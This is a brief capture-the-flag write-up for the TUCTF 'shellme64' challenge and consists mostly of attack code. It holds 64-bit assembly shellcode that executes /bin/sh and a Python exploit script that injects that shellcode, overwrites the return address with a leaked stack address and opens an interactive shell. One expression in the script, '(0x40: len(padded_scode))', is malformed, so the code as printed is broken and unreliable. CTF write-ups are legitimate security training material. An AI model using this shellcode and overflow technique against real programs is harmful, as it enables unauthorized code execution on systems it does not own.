> Same concept, more bytes.

Solved by Vanilla

This is almost identical to shellme32, we just need to switch up a string and use 64-bit shellcode:

; vim:ft=fasm
use64

xor    ecx,ecx
push   59
pop    rax
push   rcx
mov    rdx,rsp
mov    rsi,rsp
mov    rbx,'/bin/sh'
push   rbx
mov    rdi,rsp
syscall
int3

#!/usr/bin/env python3
import struct
import vanillib

SHELLCODE = open('scode.bin', 'rb').read()

def exploit(iface):
    iface.expect(b"Hey! I think you dropped this\n")
    address = int(iface.read_until(b"\n", include=False), 16)
    iface.expect(b"> ")
    padded_scode = SHELLCODE + b"\xCC" * ((-len(SHELLCODE)) % 8)
    iface.write(padded_scode + struct.pack('<Q', address) * ((0x40: len(padded_scode)) // 8) + b"exec sh -il 2>&1\n")
    iface.interact()

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{54m3_5h3llc0d3,_ju57_m0r3_by735}

